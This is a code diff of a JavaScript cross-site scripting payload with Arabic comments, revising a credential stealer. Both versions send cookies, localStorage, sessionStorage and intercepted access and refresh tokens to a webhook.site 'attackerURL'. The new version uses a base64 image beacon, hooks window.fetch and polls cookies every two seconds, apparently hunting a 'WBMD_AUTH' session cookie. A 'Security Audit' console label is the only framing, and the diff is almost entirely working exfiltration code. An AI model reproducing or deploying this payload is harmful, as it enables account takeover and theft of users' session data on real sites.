@@ -6,54 +6,48 @@ alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie
 //new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
 
 (function() {
-    console.log("%c[Security Audit] Optimized Payload Active...", "color: cyan; font-weight: bold;");
+    const attackerURL = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/exfiltrate";
 
-    const webhookUrl = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/exfiltrate";
+    // 1. وظيفة التهريب: ترسل البيانات مشفرة Base64 إلى سيرفر المهاجم
+    function sendHome(data, type) {
+        const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+        new Image().src = `${attackerURL}?type=${type}&data=${payload}`;
+    }
 
-    // دالة الإرسال مع معالجة الخطأ
-    const sendData = async (type, data) => {
-        try {
-            // تحويل البيانات لنص Base64 لتجنب مشاكل الـ CSP مع الـ JSON
-            const payload = btoa(JSON.stringify(data));
-            await fetch(`${webhookUrl}?type=${type}&data=${payload}`, {
-                mode: 'no-cors', // لتجاوز بعض قيود الـ CORS
-                cache: 'no-store'
-            });
-            console.log(`%c[+] Data Sent: ${type}`, "color: green;");
-        } catch (e) {
-            console.error("[-] Send failed:", e);
+    // 2. مراقب الكوكيز: يسحب الكوكيز الحالية ويراقب أي تغيير (لصيد WBMD_AUTH)
+    let lastCookies = "";
+    setInterval(() => {
+        if (document.cookie !== lastCookies) {
+            lastCookies = document.cookie;
+            sendHome({ cookies: lastCookies, url: location.href }, "cookies_changed");
         }
-    };
+    }, 2000);
 
-    // 1. سحب البيانات فوراً (مرة واحدة)
-    const harvestEverything = () => {
-        const loot = {
-            cookies: document.cookie,
-            localStorage: { ...localStorage },
-            sessionStorage: { ...sessionStorage },
-            url: window.location.href,
-            timestamp: new Date().toISOString()
-        };
-        sendData("full_dump", loot);
-    };
-
-    // 2. اعتراض الـ API (بدون تايمر - يعتمد على الطلب)
+    // 3. اعتراض الـ API (Fetch): لصيد access_token و refresh_token من الردود
     const originalFetch = window.fetch;
-    window.fetch = function() {
-        return originalFetch.apply(this, arguments).then(async (response) => {
-            const clone = response.clone();
-            const url = arguments[0];
-            
-            // نركز فقط على طلبات الـ Login أو الـ Tokens
-            if (url.includes("token") || url.includes("login") || url.includes("user")) {
-                const data = await clone.json().catch(() => ({}));
-                sendData("api_intercept", { url, data });
+    window.fetch = async (...args) => {
+        const response = await originalFetch(...args);
+        const clone = response.clone();
+        
+        clone.json().then(data => {
+            // إذا كان الرد يحتوي على أي نوع من التوكينات
+            if (data.access_token || data.refresh_token || data.token) {
+                sendHome({
+                    endpoint: args[0],
+                    tokens: data
+                }, "api_tokens_intercepted");
             }
-            return response;
-        });
+        }).catch(() => { /* ليس ملف JSON، يتجاهله */ });
+
+        return response;
     };
 
-    // تنفيذ السحب الأول بعد 3 ثواني لضمان استقرار الصفحة
-    setTimeout(harvestEverything, 3000);
+    // 4. نهب التخزين: سحب كل ما هو مخزن في LocalStorage و SessionStorage
+    const storageData = {
+        local: { ...localStorage },
+        session: { ...sessionStorage }
+    };
+    sendHome(storageData, "storage_dump");
 
+    console.log("%c [Security Audit] All observers initialized. Standing by...", "color: red; font-weight: bold;");
 })();
